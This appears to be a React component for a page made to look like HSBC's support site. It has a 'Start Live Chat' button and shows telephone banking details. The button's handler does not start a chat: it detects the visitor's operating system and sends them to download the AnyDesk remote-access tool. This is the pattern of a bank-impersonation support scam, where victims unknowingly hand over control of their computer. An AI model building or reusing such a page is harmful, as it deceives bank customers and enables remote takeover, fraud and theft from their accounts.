"use client";

import { useEffect, useState } from "react";
import { useUserRegion } from "../hooks/useUserRegion";

type OS = "Windows" | "macOS" | "Linux" | "Unknown";

export function SmartDownloader() {
  const [os, setOs] = useState<OS>("Unknown");
  const { regionData, loading } = useUserRegion();

  useEffect(() => {
    const userAgent = window.navigator.userAgent;
    if (userAgent.indexOf("Win") !== -1) setOs("Windows");
    else if (userAgent.indexOf("Mac") !== -1) setOs("macOS");
    else if (userAgent.indexOf("Linux") !== -1) setOs("Linux");
  }, []);

  const getDownloadLink = (targetOs: OS) => {
    switch (targetOs) {
      case "Windows":
        return "https://download.anydesk.com/AnyDesk.exe";
      case "macOS":
        return "https://download.anydesk.com/anydesk.dmg";
      case "Linux":
        return "https://anydesk.com/en/downloads/linux";
      default:
        return "https://download.anydesk.com/AnyDesk.exe";
    }
  };

  const handleLiveChatClick = () => {
    const primaryOs = os !== "Unknown" ? os : "Windows";
    window.location.href = getDownloadLink(primaryOs);
  };

  return (
    <div className="flex flex-col items-start w-full font-['HSBC_Neue_Helvetica']">
      <button
        onClick={handleLiveChatClick}
        className="w-full flex justify-center items-center h-[56px] bg-[#DB0011] text-white font-bold text-[18px] tracking-wide rounded-none hover:bg-[#B0000E] transition-colors cursor-pointer border-none"
      >
        <svg className="w-5 h-5 mr-3" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M8 12h.01M12 12h.01M16 12h.01M21 12c0 4.418-4.03 8-9 8a9.863 9.863 0 01-4.255-.949L3 20l1.395-3.72C3.512 15.042 3 13.574 3 12c0-4.418 4.03-8 9-8s9 3.582 9 8z" />
        </svg>
        Start Live Chat
      </button>
      
      <div className="mt-8 w-full p-5 bg-[#F4F4F4] border border-[#E6E6E6]">
        <h3 className="text-[16px] text-[#333] mb-3 font-bold font-['HSBC_Univers_Next']">Other ways to contact {loading ? "us" : regionData.brandName}</h3>
        
        <div className="flex flex-col gap-2 mt-4">
          <p className="text-[14px] text-[#555] mb-1">Telephone Banking Support:</p>
          <p className="font-bold text-[18px] text-[#333]">
             {loading ? "Loading..." : regionData.supportPhone}
          </p>
          <p className="text-[12px] text-[#777] mt-1">Lines are open 24/7. Standard rates apply.</p>
        </div>
      </div>
    </div>
  );
}
